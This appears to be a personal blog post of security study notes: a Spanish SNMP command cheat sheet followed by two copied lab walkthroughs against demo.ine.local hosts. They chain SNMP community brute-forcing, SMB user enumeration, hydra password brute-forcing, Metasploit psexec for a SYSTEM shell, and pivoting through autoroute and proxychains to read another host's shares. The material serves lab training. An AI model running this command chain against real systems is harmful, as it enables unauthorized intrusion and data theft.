---
title: "SNMP ()"
description: ""
pubDate: "Jul 03 2022"
heroImage: "/"
tag: ["windows", "smb"]
---

port 161 SNMP

```bash
# recolectar informacion
snmpwalk -v 2c -c public target_id

# Permite especificar un identificador de objeto or oid
# se utiliza para encontrar los programas disponibles en la máquina
snmpwalk -v 2c -c public target_ip hrSWInstalledName

snmpwalk -v 2c -c public target_ip hrMemorySize

# list
snmpwalk -v 2c -c public target_ip sysContact

# modify
snmpset -v 2c -c public target_id sysContact.0 s els

# nmap

nmap --script=snmp-win32-services


```

Solution
Step 1: Open the lab link to access the Kali GUI instance.

1

Step 2: Check if the machine/domain is reachable.

Command

ping demo.ine.local
2
The machine is reachable.

Step 3: Check open ports on the machine.

Command

nmap demo.ine.local
3

We can notice, multiple ports are open on the target machine.

Step 4: Now, let's check if the SNMP port is open or not

We must keep in mind that nmap does not check for UDP ports by default. As we already know, SNMP runs on the UDP port 161.

Therefore, let's check if this specific is opened.

Command

nmap -sU -p 161 demo.ine.local
4
As we can see, the UDP port 161 is open. This information is crucial for our following tasks.

Note: We will have to double-check nmap results by sending SNMP requests to the host and checking if we get responses from both. Sometimes, when host-based firewalls protect the hosts, they may confuse the nmap scan results.

Step 5: Now, we need to find the SNMP server community string to access the target machine service.

First, we need to discover the community strings to access the SNMP service.

Note: If you are not familiar with SNMP terms like communities, please, take a look at the course material.

We could use nmap
snmp-brute
script to find the community string. The script uses the
snmpcommunities.lst
list for brute-forcing it is located inside
/usr/share/nmap/nselib/data/snmpcommunities.lst
directory.

Command

nmap -sU -p 161 --script=snmp-brute demo.ine.local
5
As we can see, we found three community names:
public,
private,
and
secret

Step 6: Now, let's run the
snmpwalk
tool to find all the information via SNMP.

snmpwalk

snmpwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information. An object identifier (OID) may be given on the command line. This OID specifies which portion of the object identifier space will be searched using GETNEXT requests. All variables in the subtree below the given OID are queried and their values presented to the user. Each variable name is given in the format specified in variables. If no OID argument is present, snmpwalk will search the subtree rooted at SNMPv2-SMI::mib-2 (including any MIB object values from other MIB modules, that are defined as lying within this subtree). If the network entity has an error processing the request packet, an error packet will be returned and a message will be shown, helping to pinpoint why the request was malformed. If the tree search causes attempts to search beyond the end of the MIB, the message "End of MIB" will be displayed. Source https://linux.die.net/man/1/snmpwalk

We are running the
snmpwalk
command on the target machine.

Command

snmpwalk -v 1 -c public demo.ine.local
-v
: Specifies SNMP version to use

-c
: Set the community string

6

We were able to gather a lot of information via SNMP. But, this isn't in a proper readable format. We need to take the help of other tools, i.e., nmap SNMP scripts, for specific information.

Step 7: Let's run all the SNMP nmap scripts to gather all possible information via the SNMP service.

Command

nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
The above command would run all the nmap SNMP scripts on the target machine and store its output to the
snmp_output
file.
7

This nmap script scan would take some time. Please wait patiently.

From the list of information retrieved, we found a couple of engaging data, such as running processes, users, services, installed applications, etc.

However, analyzing the results, one absorbing information we could extract is the list of Windows users:

7_1

Step 8: Now, let's run a brute-force attack using these windows users on SMB service.

Remember, port 445 is open, and we can run a brute-force attack using the hydra tool.

First, let's save two usernames in a file. i.e
administrator
and
admin

8

Command

hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
The hydra switches are described in the help: hydra -help. However, the most relevant parts of the command are explained below:

-L users.txt

This is the dictionary file containing a list of users.

-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

This tells hydra to use a dictionary file containing a list of known passwords. This particular file (unix_passwords.txt) belongs to "Metasploit Framework"

demo.ine.local

The target

SMB

This is the protocol that should be used by hydra to perform the brute-force attack.

After a couple of minutes, we should see the following results:

8_1

Thus, hydra successfully found a valid password for
administrator
and
admin
users.

Step 9: Now, we will run the
psexec
Metasploit exploit module to gain the meterpreter session using these credentials.

Let's try to get a shell on this system using the PSExec module of the Metasploit framework.

PSExec (Microsoft Windows Authenticated User Code Execution)

This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. Source: https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/

Commands

msfconsole -q
use exploit/windows/smb/psexec
show options
9

As we can see, we have to set
RHOSTS
SMBUSER
and
SMBPASS.
Rest all other essential values, i.e.
PAYLOAD,
and
LHOST,
is already set.

Let's set all these values and exploit the target.

Commands

set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit
Note: If you don't gain a meterpreter session for some reason, please re-exploit the target.

9_1

We have successfully gained the meterpreter session on the target machine.

Step 10: Now, let's read the flag.

Commands

shell
cd C:\
dir
type FLAG1.txt
10

FLAG:
a8f5f167f44f4964e6c998dee827110c

We have found the flag!


############################

Commands

ping demo.ine.local
ping demo1.ine.local
2

Only one provided machine is reachable, i.e.,
demo.ine.local
, and we also found the target's IP addresses.

Step 3: Check open ports on the
demo.ine.local
machine.

Command

nmap demo.ine.local
3
Multiple ports are open on the
demo.ine.local
machine.

All the ports expose core services of the Windows operating system, i.e., SMB, RDP, RPC, etc.

There are multiple versions of the SMB protocol.

SMB1
SMB 2.0
SMB 2.1
SMB 3.0
SMB 3.0.2
SMB 3.1.1
SMBv1:

Server Message Block (SMB) is an application layer network protocol commonly used in Microsoft Windows to provide shared access to files and printers. SMBv1 is the original protocol developed in the 1980s, making it more than 30 years old. More secure and efficient versions of SMB are available today. The SMBv1 protocol is not safe to use. By using this old protocol, you lose protections such as pre-authentication integrity, secure dialect negotiation, encryption, disabling insecure guest logins, and improved message signing. Microsoft has advised customers to stop using SMBv1 because it is extremely vulnerable and full of known exploits. WannaCry, a well-known ransomware attack, exploited vulnerabilities in the SMBv1 protocol to infect other systems. Because of the security risks, support for SMBv1 has been disabled. Source: https://kb.iu.edu/d/aumn

SMBv1 is used in the old Windows operating system. However, it is still present in the latest Windows OS too. We can disable/enable all SMB versions by modifying the windows registries.

SMBv1 onwards, all the versions are reasonability secure. They provide many security protections, i.e., disabling insecure guest logins, pre-authentication integrity, secure dialect negotiation, encryption, etc.

While scanning using
nmap,
we discovered the SMB service port 445.

To learn more about all protocol versions and changes. Please refer to the following link: https://en.wikipedia.org/wiki/Server_Message_Block

Now, let's perform enumeration and exploitation of the SMB protocol.

Step 4: Let's run nmap on port 445 to get more information about the protocol.

Command

nmap -sV -p 139,445 demo.ine.local
-sV
: Probe open ports to determine service/version info

-p 139,445
: Only scan specified ports

4

We have received information about both the ports. Also, identified that the target is
Microsoft Windows Server 2008 R2 - 2012

Step 5: Now, let's identify all the supported SMB versions on the target machine.

We can quickly identify it using the nmap script
smb-protocols.
Command

nmap -p445 --script smb-protocols demo.ine.local
-p445
: Only scan specified port.

--script smb-protocols
: Script Scan

5

We can notice that all three versions are accessible.

There is one more interesting nmap script for the smb protocol to find the security level of the protocol.

Step 6: Let's run the nmap script to find the smb protocol security level.

Command

nmap -p445 --script smb-security-mode demo.ine.local
6

We have tried to access the target SMB server using a guest user. We have received SMB security level information.

We can find more information from the following link: https://nmap.org/nsedoc/scripts/smb-security-mode.html

This clarifies that the nmap script uses the
guest
user for all the smb script scan. We can define another user also. But, we need valid credentials to access the target machine.

The
guest
user is the default user available on all the windows operating systems.

If an attacker has valid credentials on the target machine. Then, command execution is possible. It depends on the user privilege.

Now, let's find that we have the
Null Session,
i.e
Anonymous
access on the target machine using the
smbclient
tool.

smbclient

smbclient is a client that can 'talk' to an SMB/CIFS server. It offers an interface similar to that of the ftp program. Operations include things like getting files from the server to the local machine, putting files from the local machine to the server, retrieving directory information from the server and so on. Step 7: Let's run the smbclient tool to find that we have anonymous access on the target machine.

Commands

smbclient -L  demo.ine.local
Enter WORKGROUP\root's password: <enter>
7
We can access the target using anonymous login.

Step 8: Now, we have anonymous access to the target machine. We can smoothly dump all the present windows users using the nmap script.

Let's find all the present users using nmap
smb-enum-users
script.

Command

nmap -p445 --script smb-enum-users.nse  demo.ine.local
8
There are a total of four users present.
admin,
administrator,
root,
and
guest

The guest and administrator users are built-in accounts.

Now, let's find the valid password for
admin,
administrator,
and
root
user.

Step 9: First, let's create a file (users.txt) and keep all these users

9

Now, let's run the hydra tool for brute-forcing the SMB protocol to find the valid password of the provided users.

Command

hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
-L
: List of users

-P
: Password list

demo.ine.local smb
: Target Address and Target Protocol

9_1

We have successfully retrieved valid passwords for all three users.

Step 10: Now, we can use the Metasploit framework and run the
psexec
exploit module to gain the meterpreter shell using the
administrator
user valid password.

Microsoft Windows Authenticated User Code Execution

This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. Source: https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/

Let's start the Metasploit framework and exploit it!

Commands

Note: If the exploit won't give you a meterpreter session. Try again!

msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit
10
Success!. We have received a meterpreter session.

Step 11: Now, we will discover target machine information, e.g., current user, system information, arch, etc.

Commands

getuid
sysinfo
11

We notice that target is running a windows server, and we have received a meterpreter session with "SYSTEM" (or "NT Authority") privileges on the machine.

Step 12: Let's read the flag.

Command

cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
12

We have found the FLAG1:
8de67f44f49264e6c99e8a8f5f17110c

Step 13: Let's check if we can access
demo1.ine.local
from the compromised host.

Before, ping to the second target machine from the compromised host. We need to know the IP address for the
demo1.ine.local
host.

Remember, when we did ping to both the targets and discovered IP addresses of these target machines:

1. demo.ine.local: 10.0.17.62

2. demo1.ine.local : 10.0.22.69

Now, let's ping to the
10.0.22.69
and verify that it is reachable from the second machine.

Commands

shell
ping 10.0.22.69
13

We can access the
demo1.ine.local
machine, i.e.,
10.0.22.69
.

However, we cannot access that machine (10.0.22.69) from the Kali machine. So, here we need to perform pivoting by adding route from the Metasploit framework.

Step 14: Let's add the route using the meterpreter session and identify the second machine service.

Commands

CTRL + C
y
run autoroute -s 10.0.22.69/20
14

We have successfully added the route to access the
demo1.ine.local
machine.

Step 15: Now, let's start the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.

First start the
socks4a
server using the Metasploit module.

Socks4a Proxy Server

This module provides a socks4a proxy server with built-in Metasploit routing to relay connections. Source:: https://www.rapid7.com/db/modules/auxiliary/server/socks4a/

Note: The proxychains should have configured with the following parameters (at the end of /etc/proxychains4.conf):

Command

cat /etc/proxychains4.conf
15

We can notice, socks4 port is 9050.

Now, let's run the Metasploit socks proxy auxiliary server module on port 9050.

Commands

background
use auxiliary/server/socks_proxy
show options
15_1
We notice that SRVPORT is
1080
, and VERSION is
5
mentioned in the module options. But, we need to set the port to
9050
and the version to
4a
. Let's change both the values then run the server.

Commands:

set SRVPORT 9050
set VERSION 4a 
exploit
jobs
15_2

We can notice that the server is running perfectly.

Step 16: Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine, i.e.
demo1.ine.local

We could also specify multiple ports. But, in this case, we are only interested in SMB service.

Command:

proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
demo1.ine.local
: The pivot machine
-sT
: TCP connect scan

-Pn
: Skip host discovery and force port scan.

-sV
: Probe open ports to determine service/version info

-p 445
: Define port to scan

This scan is the safest way to identify the open ports. We could use an auxiliary TCP port scanning module. But those are very aggressive and can kill your session.

16

We notice that port 445 is open on the target machine.

Step 17: Now, let's use the
net view
command to find all resources shared by the
demo1.ine.local
machine.

Interact with the meterpreter session again.

Commands:

sessions -i 1
shell
net view 10.0.22.69
17]

We have received the
Access is denied.
message.

Well, currently, we are running as
NT AUTHORITY\SYSTEM
privilege. Let's migrate the process into
explorer.exe
and reaccess it.

Commands:

CTRL + C
migrate -N explorer.exe
shell
net view 10.0.22.69
17_1

This time we can see two shared resources.
Documents
and
K
drive. And, this confirms that pivot target (demo1.ine.local) allows
Null Sessions,
so we can access the shared resources. Also, we can achieve the same goal in several ways.

Step 18: Now, we can map the shared drive to the
demo.ine.local
machine using the' net' command.

Let's map the shared resources, i.e., the
Documents
and
K
drive.

Commands:

net use D: \\10.0.22.69\Documents
net use K: \\10.0.22.69\K$
18

We successfully mapped the resources to
D
and
K
drives.

Step 19: Let's check what is inside these mapped drives.

Commands:

dir D:
dir K:
19

Now that we can browse the shares content, we can download or read it on the attacker's machine.

Let's read the
FLAG2
and
Confidential.txt
files.

Commands:

CTRL + C
cat D:\\Confidential.txt
cat D:\\FLAG2.txt
19_1
19_2]

We have found the FLAG2:
c8f58de67f44f49264e6c99e8f17110c

This file is the ultimate proof for the client. The organization files are not safe. Therefore, policies and proper configurations should be implemented inside and outside the perimeter.